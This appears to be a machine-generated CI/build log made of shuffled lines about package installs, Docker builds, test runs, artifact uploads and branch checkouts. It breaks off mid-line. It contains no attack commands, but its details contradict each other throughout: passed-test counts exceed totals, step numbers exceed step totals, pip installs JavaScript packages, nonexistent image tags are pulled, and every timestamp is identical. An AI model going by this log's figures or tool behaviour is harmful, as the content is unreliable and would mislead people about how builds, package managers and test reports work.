axios-5.18.tar.gz\nStep 1/25: Installing dependencies\nMinifying app.js\nSwitched to branch 'bugfix/task-236'\nUploading artifact 'dist' (47 files)\nWARNING: jest has known vulnerabilities\nTests: 430 passed, 166 total\nCompiling src/app.ts...\nEnvironment: production\nGET /health - 204 (86ms)\nTLS handshake completed\nWARNING: react has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nStep 9/20: Linting\nArtifact downloaded: 22MB\nMinifying app.js\nSnapshots: 28 passed, 6 total\npip install: Successfully installed jest-5.20\nHEAD is now at 85a8523\nVerifying...\nPushing to registry...\nOptimizing 37 modules...\nSnapshots: 28 passed, 18 total\nArtifact uploaded: build.tar.gz (21MB)\nCreating production build...\n[12:19:13] DEBUG: Query executed in 45ms\n[12:19:13] DEBUG: Connection pool: 4 active\nGET /api - 200 (14ms)\nnpm install: resolved 487 packages\n[12:19:13] DEBUG: Initializing service\nMinifying app.js\nyarn add: Done in 8.84s\nStep 3/24: Linting\nGET /health - 200 (91ms)\nUploading artifact 'build' (25 files)\nStep 11/24: Installing dependencies\n[12:19:13] DEBUG: Memory usage: 1445MB\n\u2713 Step 'test' succeeded\nFinished.\nGET /status - 200 (48ms)\nImage pulled successfully\nMinifying main.js\nStep 3/23: Linting\nCache hit for key-3775\nUsing Node.js 20.14.5\nnpm notice: package.json updated\nChecking out main branch\nArtifact uploaded: build.tar.gz (49MB)\n[12:19:13] INFO: Processing request\nChecking out develop branch\nFetching submodules...\nTime: 115.780s\nGenerating source maps...\nBuilding Docker image...\nStep 12/17: Running migrations\n[12:19:13] DEBUG: Memory usage: 1447MB\nCompiling src/index.js...\nWARNING: webpack has known vulnerabilities\nAlready up to date.\nnpm notice: package.json updated\nnpm notice: package.json updated\nSuccess!\nGET /health - 200 (93ms)\n[12:19:13] DEBUG: Initializing service\nRan 126 tests in 29s\nStep 8/17: Running migrations\nNODE_ENV=production\nWARNING: axios has known vulnerabilities\nProcessing...\nOK\nArtifact uploaded: build.tar.gz (48MB)\nConnection established\nTest Suites: 26 passed, 7 total\nnpm notice: package.json updated\nUploading artifact 'dist' (46 files)\nOK\nLoading...\n[12:19:13] DEBUG: Loading configuration\nWARNING: lodash has known vulnerabilities\nnpm notice: package.json updated\nCache hit for key-4900\nOptimizing 48 modules...\nCompiling src/utils.go...\nCompiling utils/index.js...\npip: Downloading lodash-2.8.tar.gz\nTime: 91.211s\nnpm install: added 167 packages\nArtifact uploaded: dist.zip (5MB)\nCompiling utils/main.py...\nWaiting...\nArtifact uploaded: dist.zip (11MB)\n[12:19:13] INFO: Request completed\nReady.\nChecking out master branch\nUsing Python 3.12\nnpm install: added 56 packages\nTLS handshake completed\nyarn add: Done in 17.20s\nConnecting to example.com:443...\nProcessing...\n[12:19:13] DEBUG: Memory usage: 1863MB\nPOST /data - 200 (461ms)\nArtifact uploaded: build.tar.gz (43MB)\nProcessing...\nUploading artifact 'dist' (26 files)\nyarn add: Done in 13.44s\n\u2713 Step 'checkout' succeeded\nStep 10/23: Building\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] DEBUG: Initializing service\nnpm install: added 291 packages\nUploading artifact 'coverage' (46 files)\nWaiting...\n[12:19:13] INFO: Connecting to database\nReady.\nUsing Node.js 18.9.9\nPushing to registry...\nPushing to registry...\nBuilding Docker image...\nTests: 328 passed, 238 total\nStep 20/16: Running migrations\nStep 6/21: Running migrations\nOptimizing 56 modules...\nyarn add: Done in 3.11s\nProcessing...\nArtifact uploaded: dist.zip (78MB)\nTest Suites: 18 passed, 23 total\nCompleted.\nImage pulled successfully\npip install: Successfully installed axios-2.2\nEnvironment: development\nLoading...\nCache restored successfully (325MB)\nPOST /upload - 200 (193ms)\n\u2713 All checks passed\nFetching submodules...\npip install: Successfully installed axios-2.19\nyarn add: Done in 12.93s\nException: ValueError\nCache invalidated: build\nEnvironment: production\nPushing to registry...\nBundling main.css\nArtifact downloaded: 35MB\n[12:19:13] DEBUG: Initializing service\nStep 15/23: Building\nVerifying...\nReady.\n[12:19:13] INFO: Request completed\nWaiting...\n\u2713 Step 'test' succeeded\n  PASS: integration/test_api_health.spec.js\nMinifying main.js\n[12:19:13] INFO: Cache refreshed\nBuilding Docker image...\nPlatform: win32-x64\n[12:19:13] INFO: Starting build process\n  PASS: integration/test_cache_hit.spec.js\nRan 18 tests in 3s\nStep 10/25: Building\nReady.\n[12:19:13] DEBUG: Memory usage: 1406MB\nCompiling utils/utils.go...\nStep 6/22: Deploying\n  PASS: test_api_health (264ms)\nNODE_ENV=test\nUsing Node.js 18.9.9\nStep 2/22: Testing\nTLS handshake completed\n\u2713 All checks passed\n[12:19:13] DEBUG: Memory usage: 163MB\n=== Step deploy_staging completed ===\n=== Step: unit_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /upload - 201 (176ms)\nArtifact uploaded: dist.zip (95MB)\nCache restored successfully (132MB)\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nOK\nHEAD is now at afef533\nStep 11/17: Installing dependencies\nTime: 78.539s\n  PASS: integration/test_db_connect.spec.js\nArtifact uploaded: build.tar.gz (50MB)\nAlready up to date.\n[12:19:13] INFO: Connecting to database\n[12:19:13] INFO: Processing request\nRan 61 tests in 11s\n[12:19:13] DEBUG: Initializing service\n[12:19:13] DEBUG: Connection pool: 2 active\nTest Suites: 8 passed, 7 total\nStep 2/24: Testing\nCache invalidated: dependencies\nStep 18/22: Testing\nBuilding Docker image...\nPushing to registry...\nCache restored successfully (221MB)\nWARNING: react has known vulnerabilities\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (10ms)\nGenerating source maps...\npip: Installing build dependencies...\npip: Collecting react\nPOST /api - 202 (116ms)\nArtifact uploaded: dist.zip (85MB)\n[12:19:13] WARN: Deprecated API usage\nInstalling express@2.1.0\n[12:19:13] INFO: Starting build process\nWARNING: lodash has known vulnerabilities\nStep 9/22: Testing\npip: Installing build dependencies...\nChecking out master branch\nStep 8/22: Building\nProcessing...\nCache miss for key-1876\npip: Collecting express\nSnapshots: 2 passed, 48 total\nCache restored successfully (85MB)\n[12:19:13] INFO: Starting build process\nCache invalidated: build\nnpm install: resolved 1968 packages\npip install: Successfully installed lodash-2.20\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 153 tests in 35s\nGET /status - 201 (8ms)\nUsing Node.js 18.3.9\nLoading...\nDone.\nStep 14/15: Deploying\nInstalling webpack@3.6.0\nnpm notice: created a lockfile\nEnvironment: production\nStep 2/25: Installing dependencies\nArtifact downloaded: 32MB\nUploading artifact 'build' (4 files)\nBuilding Docker image...\nConnecting to cloud.services:443...\n[12:19:13] INFO: Request completed\n[12:19:13] DEBUG: Connection pool: 6 active\nGET /health - 204 (54ms)\nFetching submodules...\npip: Downloading lodash-4.5.tar.gz\nCompiling src/app.ts...\nConnecting to acme.corp:443...\n[12:19:13] INFO: Starting build process\nTest Suites: 50 passed, 18 total\npip: Collecting jest\n[12:19:13] WARN: Deprecated API usage\n  PASS: test_api_health (194ms)\nCache restored successfully (37MB)\n\u2713 All checks passed\n[12:19:13] DEBUG: Memory usage: 294MB\n[12:19:13] DEBUG: Connection pool: 2 active\nInstalling axios@1.5.0\nException: TypeError\nStep 18/16: Deploying\nOptimizing 18 modules...\nPushing to registry...\nWARNING: prettier has known vulnerabilities\nOptimizing 82 modules...\nCache hit for key-7310\npip: Collecting express\nStep 5/21: Installing dependencies\nInstalling webpack@3.1.9\nCache restored successfully (452MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:13] WARN: Deprecated API usage\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: resolved 1255 packages\nUsing Node.js 17.18.2\nPushing to registry...\npip: Installing build dependencies...\n[12:19:13] ERROR: Connection failed\nStep 19/22: Linting\nTLS handshake completed\npip: Downloading react-4.4.tar.gz\nLayer 5/12: ENV command\nLoading...\nOptimizing 31 modules...\nImage pulled successfully\nPushing to registry...\nArtifact downloaded: 19MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:13] INFO: Processing request\nnpm install: added 88 packages\npip: Installing build dependencies...\nVerifying...\nTLS handshake completed\nBundling runtime.js\nUsing Node.js 15.9.1\nVerifying...\nPOST /upload - 201 (254ms)\nCache restored successfully (404MB)\nTest Suites: 17 passed, 8 total\npip: Downloading webpack-5.17.tar.gz\n[12:19:13] DEBUG: Initializing service\nTransforming 258 files...\nWaiting...\nCache saved successfully\nCompiling src/utils.go...\nBuilding Docker image...\nTransforming 648 files...\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nPushing to registry...\nSuccess!\n  PASS: test_api_health (420ms)\nLoading...\nStep 20/24: Installing dependencies\n[12:19:13] INFO: Processing request\nCache hit for key-7576\nEnvironment: development\nnpm notice: created a lockfile\nnpm install: added 330 packages\nWARNING: express has known vulnerabilities\nPlatform: darwin-arm64\nConnection established\nFinished.\nHEAD is now at 5f2fcee\n[12:19:13] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (63MB)\nCache saved successfully\n[12:19:13] DEBUG: Memory usage: 588MB\n[12:19:13] INFO: Processing request\n\u2713 Step 'setup' succeeded\npip: Installing build dependencies...\nStep 6/24: Deploying\nDone.\nGenerating source maps...\n\u2713 Task completed in 4624ms\n[12:19:13] INFO: Processing request\nEnvironment: development\npip: Installing build dependencies...\nOptimizing 47 modules...\n\u2717 build failed with exit code 36\nWaiting...\nBuilding Docker image...\nAlready up to date.\nWaiting...\nFinished.\npip install: Successfully installed jest-3.15\nStep 15/15: Testing\nSnapshots: 37 passed, 8 total\n[12:19:13] INFO: Connecting to database\nnpm install: added 165 packages\n[12:19:13] INFO: Starting build process\nStep 10/19: Installing dependencies\nBundling vendor.css\n[12:19:13] WARN: Deprecated API usage\n\u2713 Task completed in 2836ms\nCache hit for key-7431\nStep 6/19: Installing dependencies\nUsing Python 3.11\nStep 9/19: Installing dependencies\n[12:19:13] INFO: Connecting to database\nStep 4/19: Deploying\nUploading artifact 'dist' (42 files)\nCreating production build...\nPulling image: alpine:18\nWARNING: lodash has known vulnerabilities\nGenerating source maps...\nWARNING: react has known vulnerabilities\n\u2713 All checks passed\nException: NullPointerException\nUploading artifact 'coverage' (42 files)\nStep 13/21: Linting\nEnvironment: development\nSuccess!\nTest Suites: 32 passed, 37 total\n\u2713 Step 'checkout' succeeded\nUsing Node.js 18.13.2\nCache invalidated: node_modules\nCache restored successfully (192MB)\nCompiling src/main.py...\n\u2713 Step 'build' succeeded\n[12:19:13] DEBUG: Connection pool: 11 active\nGET /health - 204 (69ms)\nBuilding Docker image...\n\u2713 All checks passed\nTime: 23.719s\nLoading...\n  PASS: test_user_create (398ms)\nyarn add: Done in 30.6s\n[12:19:13] INFO: Starting build process\nFetching submodules...\n\u2713 All checks passed\nInstalling jest@5.6.5\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 Step 'setup' succeeded\nArtifact uploaded: dist.zip (47MB)\nAlready up to date.\n  PASS: test_cache_hit (108ms)\n[12:19:13] WARN: Deprecated API usage\npip: Installing build dependencies...\nFetching submodules...\n[12:19:13] WARN: Deprecated API usage\nArtifact downloaded: 38MB\nCache miss for key-6979\nArtifact downloaded: 28MB\n\u2713 Task completed in 4130ms\nCache restored successfully (163MB)\nStep 8/21: Running migrations\nyarn add: Done in 27.5s\nStep 16/19: Linting\npip: Installing build dependencies...\nStep 8/20: Testing\nBundling runtime.js\nProcessing...\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\nStep 19/21: Deploying\nSnapshots: 43 passed, 2 total\nPulling image: node:latest\nDone.\nCache invalidated: dependencies\nSwitched to branch 'feature/task-785'\nnpm notice: package.json updated\n[12:19:13] ERROR: Connection failed\nPOST /data - 200 (48ms)\nOptimizing 60 modules...\nGenerating source maps...\nChecking out main branch\nOK\nAlready up to date.\n[12:19:13] INFO: Cache refreshed\nNODE_ENV=production\nTLS handshake completed\nEnvironment: test\nHEAD is now at d5817f6\nStep 1/20: Deploying\nDone.\nCreating production build...\nBuilding Docker image...\nStep 3/17: Testing\nTime: 63.75s\nGenerating source maps...\nCompleted.\nSwitched to branch 'feature/task-439'\nGenerating source maps...\nArtifact uploaded: build.tar.gz (33MB)\nArtifact downloaded: 50MB\nHEAD is now at 806ba0a\nEnvironment: production\n[12:19:13] DEBUG: Connection pool: 15 active\nChecking out master branch\nCache invalidated: build\nWaiting...\nEnvironment: staging\nImage pulled successfully\n[12:19:13] DEBUG: Memory usage: 1218MB\nFAILED: test_auth_login\npip install: Successfully installed lodash-4.20\n[12:19:13] DEBUG: Memory usage: 1288MB\n[12:19:13] ERROR: Connection failed\nNODE_ENV=test\nUsing Node.js 15.18.3\nCompiling utils/service.java...\n[12:19:13] DEBUG: Connection pool: 20 active\nInstalling lodash@5.8.8\nCache hit for key-2674\n[12:19:13] WARN: Deprecated API usage\npip install: Successfully installed eslint-4.10\nArtifact downloaded: 14MB\n[12:19:13] DEBUG: Memory usage: 1354MB\nArtifact downloaded: 31MB\nUploading artifact 'coverage' (48 files)\nCompiling lib/main.py...\nArtifact downloaded: 21MB\nCache saved successfully\nPushing to registry...\nStep 13/23: Running migrations\nLoading...\nWARNING: webpack has known vulnerabilities\nWARNING: axios has known vulnerabilities\nChecking out master branch\n[12:19:13] ERROR: Connection failed\npip: Downloading react-1.19.tar.gz\nSwitched to branch 'hotfix/task-590'\nEnvironment: staging\nPlatform: darwin-arm64\nWaiting...\nCache saved successfully\nOptimizing 97 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\nStep 1/19: Deploying\nPlatform: darwin-arm64\n\u2713 All checks passed\nOptimizing 67 modules...\n[12:19:13] DEBUG: Loading configuration\nTLS handshake completed\n\u2713 Task completed in 4981ms\nPushing to registry...\nUsing Python 3.12\n  PASS: test_user_create (361ms)\nConnecting to startup.dev:443...\n[12:19:13] DEBUG: Query executed in 53ms\nSnapshots: 37 passed, 27 total\nUploading artifact 'dist' (14 files)\nGET /health - 201 (53ms)\nFetching submodules...\nHEAD is now at 092bec4\nInstalling express@5.3.0\nPushing to registry...\nnpm notice: created a lockfile\nWARNING: lodash has known vulnerabilities\npip: Installing build dependencies...\n[12:19:13] DEBUG: Memory usage: 200MB\nTest Suites: 33 passed, 9 total\nCache restored successfully (79MB)\n  PASS: test_cache_hit (491ms)\nConnection established\n[12:19:13] DEBUG: Loading configuration\nEnvironment: test\nStep 5/22: Building\nHEAD is now at a24b499\nStep 16/19: Testing\nSnapshots: 39 passed, 20 total\n\u2713 All checks passed\nCoverage: 94% statements, 95% branches\nCompiling lib/app.ts...\nTransforming 390 files...\n[12:19:13] INFO: Starting build process\npip: Collecting lodash\nReady.\nCompiling components/handler.rs...\n[12:19:13] DEBUG: Query executed in 75ms\nyarn add: Done in 15.23s\n\u2713 Step 'test' succeeded\nnpm install: resolved 832 packages\nArtifact uploaded: build.tar.gz (19MB)\nCompiling components/main.py...\nOK\npip: Downloading axios-3.14.tar.gz\nWARNING: eslint has known vulnerabilities\nTest Suites: 37 passed, 14 total\nStep 15/23: Running migrations\nBuilding Docker image...\nnpm notice: package.json updated\nStep 2/25: Testing\n[12:19:13] DEBUG: Initializing service\nStep 11/22: Building\nStep 18/23: Deploying\nArtifact uploaded: build.tar.gz (49MB)\nMinifying vendor.js\nCoverage: 92% statements, 65% branches\nStep 9/19: Building\nReady.\nWARNING: axios has known vulnerabilities\nStep 3/17: Installing dependencies\nAlready up to date.\nnpm notice: created a lockfile\nTime: 120.436s\nStep 3/17: Running migrations\n\u2713 All checks passed\npip: Downloading lodash-5.3.tar.gz\nBuilding Docker image...\nRan 172 tests in 11s\n[12:19:13] DEBUG: Memory usage: 1657MB\nTime: 76.331s\nArtifact downloaded: 22MB\nUsing Python 3.11\nnpm notice: created a lockfile\nTLS handshake completed\nConnecting to example.com:443...\n\u2713 Step 'setup' succeeded\nCompleted.\nTime: 117.537s\nUsing Python 3.10\nStep 11/18: Deploying\nOptimizing 14 modules...\nWARNING: react has known vulnerabilities\nyarn add: Done in 20.11s\n[12:19:13] DEBUG: Connection pool: 1 active\nInstalling express@4.4.7\nTransforming 791 files...\nStep 4/15: Testing\nStep 3/23: Linting\nChecking out develop branch\nTLS handshake completed\nStep 6/21: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:13] DEBUG: Loading configuration\nTransforming 851 files...\n\u2713 Step 'install' succeeded\nOK\nException: NullPointerException\nArtifact downloaded: 23MB\n  PASS: e2e/test_auth_login.spec.js\nWARNING: eslint has known vulnerabilities\nnpm install: resolved 876 packages\nException: RuntimeError\nTime: 21.368s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'coverage' (37 files)\nLoading...\n\u2713 All checks passed\n[12:19:13] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\n\u2713 lint completed\nRan 144 tests in 12s\nCoverage: 90% statements, 79% branches\nTime: 6.587s\nCreating production build...\nStep 15/22: Testing\nyarn add: Done in 24.81s\nOK\nDone.\n[12:19:13] DEBUG: Memory usage: 743MB\n  PASS: test_user_create (143ms)\nReady.\nBuilding Docker image...\nCache restored successfully (389MB)\nArtifact downloaded: 45MB\nCompleted.\n[12:19:13] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTime: 48.498s\nLoading...\nUploading artifact 'coverage' (36 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 4224ms\nInstalling lodash@5.4.10\nOK\nStep 3/23: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed express-2.16\nTime: 25.993s\nUsing Python 3.9\n\u2713 test completed\nUsing Python 3.11\nyarn add: Done in 18.76s\nCache restored successfully (220MB)\n[12:19:13] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (57MB)\nInstalling react@1.7.10\nnpm install: resolved 670 packages\nChecking out develop branch\n[12:19:13] DEBUG: Initializing service\n\u2713 Step 'test' succeeded\n\u2713 All checks passed\nInstalling lodash@4.5.10\nLayer 7/15: RUN command\nFetching submodules...\n[12:19:13] DEBUG: Memory usage: 144MB\nStep 16/24: Deploying\nFetching submodules...\nWARNING: eslint has known vulnerabilities\nCompiling utils/service.java...\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\nBuilding Docker image...\npip: Downloading jest-1.3.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:13] INFO: Starting build process\nOK\nBuilding Docker image...\nNODE_ENV=test\nSnapshots: 26 passed, 4 total\n\u2713 Task completed in 3605ms\nUsing Python 3.10\nCache miss for key-5211\nConnection established\nException: RuntimeError\nException: NullPointerException\n[12:19:13] INFO: Processing request\n[12:19:13] INFO: Starting build process\nBundling styles.css\n  PASS: e2e/test_cache_hit.spec.js\nWARNING: lodash has known vulnerabilities\nGET /api - 201 (41ms)\n[12:19:13] WARN: Deprecated API usage\n\u2717 build failed with exit code 110\n\u2713 deploy completed\nFetching submodules...\nBuilding Docker image...\nConnecting to example.com:443...\n\u2713 build completed\n[12:19:13] INFO: Request completed\nEnvironment: development\nOptimizing 51 modules...\n  PASS: test_auth_login (254ms)\nTime: 59.353s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:13] INFO: Processing request\n[12:19:13] WARN: Deprecated API usage\nConnecting to startup.dev:443...\nCache saved successfully\nCache saved successfully\nTransforming 995 files...\n[12:19:13] INFO: Connecting to database\nOK\n[12:19:13] INFO: Cache refreshed\n[12:19:13] DEBUG: Memory usage: 1813MB\nMinifying vendor.js\nInstalling react@2.16.8\nCompiling utils/index.js...\n[12:19:13] WARN: Deprecated API usage\nCache saved successfully\nSuccess!\nnpm install: added 292 packages\nStep 10/25: Deploying\nSuccess!\nnpm install: resolved 598 packages\nTests: 193 passed, 322 total\nVerifying...\nAlready up to date.\nVerifying...\n[12:19:13] DEBUG: Initializing service\n[12:19:13] INFO: Starting build process\nInstalling webpack@4.20.6\n\u2713 Step 'build' succeeded\nUsing Python 3.10\nUsing Node.js 19.9.6\nAlready up to date.\nWaiting...\n[12:19:13] INFO: Connecting to database\nStep 14/20: Running migrations\npip install: Successfully installed express-5.4\nSwitched to branch 'hotfix/task-805'\nStep 14/24: Deploying\n\u2713 Task completed in 3702ms\nSuccess!\nOptimizing 76 modules...\nCache restored successfully (195MB)\nLayer 9/14: COPY command\nMinifying app.js\nnpm notice: created a lockfile\nStep 12/22: Deploying\nCache restored successfully (372MB)\nCoverage: 80% statements, 82% branches\n[12:19:13] INFO: Request completed\nPlatform: linux-x64\n[12:19:13] INFO: Cache refreshed\nCache miss for key-2989\nCompleted.\nArtifact uploaded: build.tar.gz (36MB)\nTime: 32.215s\n[12:19:13] INFO: Request completed\n[12:19:13] INFO: Connecting to database\nAlready up to date.\n[12:19:13] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 2292ms\nnpm install: added 266 packages\nWARNING: react has known vulnerabilities\nGET /api - 200 (93ms)\n[12:19:13] ERROR: Connection failed\nEnvironment: test\nUsing Python 3.9\nEnvironment: development\n[12:19:13] DEBUG: Connection pool: 8 active\nStep 17/22: Testing\nyarn add: Done in 16.61s\n[12:19:13] INFO: Processing request\npip install: Successfully installed jest-1.8\nCache restored successfully (58MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nCompiling components/app.ts...\nUsing Node.js 15.10.2\nPOST /data - 200 (235ms)\nArtifact uploaded: build.tar.gz (26MB)\nCache saved successfully\n[12:19:13] INFO: Starting build process\nTLS handshake completed\nWaiting...\n  PASS: unit/test_db_connect.spec.js\nException: NullPointerException\nnpm install: resolved 1314 packages\nSwitched to branch 'bugfix/task-706'\nTests: 197 passed, 317 total\nWARNING: eslint has known vulnerabilities\nUploading artifact 'dist' (21 files)\npip install: Successfully installed eslint-3.10\nTests: 217 passed, 411 total\nConnecting to example.com:443...\nBuilding Docker image...\nBundling main.js\nStep 2/18: Running migrations\nSuccess!\nTime: 8.335s\n\u2713 All checks passed\nStep 17/20: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 44 passed, 27 total\nnpm install: added 248 packages\nWARNING: eslint has known vulnerabilities\n\u2713 Task completed in 2786ms\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1935 packages\n[12:19:13] INFO: Starting build process\nCompiling lib/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /data - 202 (86ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\n[12:19:13] DEBUG: Query executed in 32ms\n[12:19:13] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1260\n\u2713 lint completed\nStep 11/20: Deploying\nCache invalidated: dependencies\nWaiting...\n[12:19:13] INFO: Processing request\n\u2713 Step 'setup' succeeded\nSnapshots: 25 passed, 36 total\nCache invalidated: node_modules\npip: Downloading lodash-1.5.tar.gz\nStep 15/25: Linting\nWARNING: prettier has known vulnerabilities\nCoverage: 76% statements, 74% branches\nnpm notice: created a lockfile\nUsing Node.js 16.19.1\nTest Suites: 6 passed, 28 total\nImage pulled successfully\npip install: Successfully installed express-1.5\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 test completed\n[12:19:13] ERROR: Connection failed\nProcessing...\n[12:19:13] DEBUG: Initializing service\nCreating production build...\nConnection established\nTests: 390 passed, 483 total\nyarn add: Done in 10.38s\nOK\nTLS handshake completed\npip: Downloading prettier-1.2.tar.gz\nPlatform: win32-x64\n  PASS: test_db_connect (370ms)\nRan 78 tests in 9s\n[12:19:13] WARN: Deprecated API usage\nLoading...\nnpm install: resolved 774 packages\n[12:19:13] INFO: Request completed\nWARNING: jest has known vulnerabilities\npip: Installing build dependencies...\nPulling image: alpine:18\n[12:19:13] INFO: Connecting to database\nUsing Node.js 17.16.2\nOK\nReady.\nImage pulled successfully\nSwitched to branch 'hotfix/task-495'\nCompiling lib/handler.rs...\nWARNING: axios has known vulnerabilities\nUploading artifact 'dist' (40 files)\nCompiling lib/handler.rs...\nGenerating source maps...\nPulling image: node:3.11\nTime: 90.614s\nTime: 96.615s\nTime: 71.202s\nChecking out develop branch\nGET /health - 204 (57ms)\nSnapshots: 45 passed, 47 total\nnpm install: resolved 561 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\nTime: 5.444s\nnpm install: resolved 1939 packages\nCache restored successfully (241MB)\nStep 19/23: Building\n[12:19:13] DEBUG: Connection pool: 7 active\nCache restored successfully (170MB)\nWARNING: prettier has known vulnerabilities\nPulling image: node:latest\nCache invalidated: node_modules\nStep 12/22: Building\n[12:19:13] DEBUG: Memory usage: 1465MB\nRan 56 tests in 36s\nConnecting to cloud.services:443...\n  PASS: integration/test_api_health.spec.js\nArtifact uploaded: dist.zip (24MB)\nBundling runtime.css\nPushing to registry...\n\u2713 validate completed\n\u2713 Task completed in 103ms\n[12:19:13] INFO: Cache refreshed\nyarn add: Done in 30.93s\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 36MB\n[12:19:13] WARN: Deprecated API usage\n=== Step setup_environment completed ===\n=== Step: type_check ===\nOptimizing 14 modules...\nInstalling eslint@1.15.6\nCompiling src/app.ts...\nConnection established\n[12:19:13] INFO: Processing request\nPushing to registry...\n[12:19:13] DEBUG: Initializing service\nSuccess!\nChecking out develop branch\n\u2717 build failed with exit code 35\nHEAD is now at 3d2815d\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /health - 201 (97ms)\nMinifying app.js\n[12:19:13] INFO: Connecting to database\nCache saved successfully\nAlready up to date.\n[12:19:13] INFO: Connecting to database\n[12:19:13] DEBUG: Loading configuration\nCache miss for key-2249\nSuccess!\nFinished.\n[12:19:13] INFO: Request completed\npip: Collecting webpack\nPOST /data - 202 (58ms)\n[12:19:13] DEBUG: Query executed in 70ms\n\u2713 Task completed in 1100ms\nCompiling utils/index.js...\nEnvironment: test\npip: Installing build dependencies...\nMinifying app.js\nPlatform: win32-x64\n  PASS: unit/test_auth_login.spec.js\nCache hit for key-3207\nPlatform: darwin-arm64\nFinished.\n[12:19:13] DEBUG: Loading configuration\nOptimizing 30 modules...\nSnapshots: 23 passed, 8 total\nCompiling src/service.java...\nHEAD is now at cf9fdae\nSuccess!\n\u2713 Step 'install' succeeded\nCompiling components/app.ts...\nSwitched to branch 'hotfix/task-227'\n\u2713 Step 'build' succeeded\nUploading artifact 'dist' (16 files)\n\u2713 build completed\nGenerating source maps...\nCreating production build...\nCompiling components/app.ts...\nyarn add: Done in 26.98s\nException: NullPointerException\nFinished.\nLayer 4/13: COPY command\nFinished.\n\u2717 build failed with exit code 16\n  PASS: test_auth_login (392ms)\n\u2713 lint completed\n[12:19:13] INFO: Starting build process\nOK\n[12:19:13] DEBUG: Memory usage: 594MB\npip: Collecting express\nWARNING: lodash has known vulnerabilities\n[12:19:13] INFO: Starting build process\nSnapshots: 42 passed, 20 total\nUploading artifact 'build' (10 files)\n  PASS: test_user_create (275ms)\nException: RuntimeError\nTime: 108.968s\nHEAD is now at 00010d8\nArtifact downloaded: 11MB\nnpm notice: created a lockfile\nCache restored successfully (289MB)\n[12:19:13] INFO: Cache refreshed\n[12:19:13] WARN: Deprecated API usage\n\u2717 build failed with exit code 107\n[12:19:13] INFO: Cache refreshed\nPushing to registry...\nArtifact uploaded: dist.zip (12MB)\nWARNING: express has known vulnerabilities\nBundling styles.css\n[12:19:13] INFO: Processing request\n[12:19:13] DEBUG: Query executed in 15ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Node.js 18.14.5\nCache hit for key-6517\nWARNING: eslint has known vulnerabilities\nFinished.\nCompiling lib/utils.go...\nArtifact uploaded: build.tar.gz (8MB)\n[12:19:13] WARN: Deprecated API usage\nSuccess!\nMinifying vendor.js\nUsing Python 3.10\nBundling runtime.css\nUsing Python 3.10\n[12:19:13] DEBUG: Query executed in 30ms\nTransforming 471 files...\nUploading artifact 'dist' (39 files)\nPOST /data - 200 (196ms)\nPulling image: alpine:3.11\nBuilding Docker image...\nNODE_ENV=test\nEnvironment: production\n[12:19:13] WARN: Deprecated API usage\nCache hit for key-9455\nNODE_ENV=test\nSnapshots: 36 passed, 4 total\nCache restored successfully (82MB)\n\u2717 build failed with exit code 8\nSnapshots: 40 passed, 23 total\nProcessing...\n  PASS: unit/test_api_health.spec.js\nOK\n[12:19:13] ERROR: Connection failed\nCache invalidated: node_modules\nLayer 7/15: COPY command\nDone.\nFinished.\nConnection established\nCache hit for key-3827\nImage pulled successfully\nPulling image: alpine:latest\nLayer 7/10: ENV command\nOK\n[12:19:13] INFO: Starting build process\n[12:19:13] ERROR: Connection failed\npip: Installing build dependencies...\nStep 13/20: Testing\nPushing to registry...\nStep 1/15: Testing\nPOST /data - 201 (204ms)\nWARNING: react has known vulnerabilities\nWaiting...\nOK\nCoverage: 89% statements, 70% branches\npip: Downloading eslint-5.8.tar.gz\nPlatform: darwin-arm64\npip: Installing build dependencies...\nGenerating source maps...\nPlatform: linux-x64\nUsing Python 3.11\nInstalling express@5.14.2\n  PASS: test_db_connect (333ms)\npip install: Successfully installed react-1.4\nnpm notice: package.json updated\nSwitched to branch 'hotfix/task-854'\nGenerating source maps...\nStep 7/24: Deploying\nStep 4/19: Installing dependencies\nFetching submodules...\nCache hit for key-7197\nStep 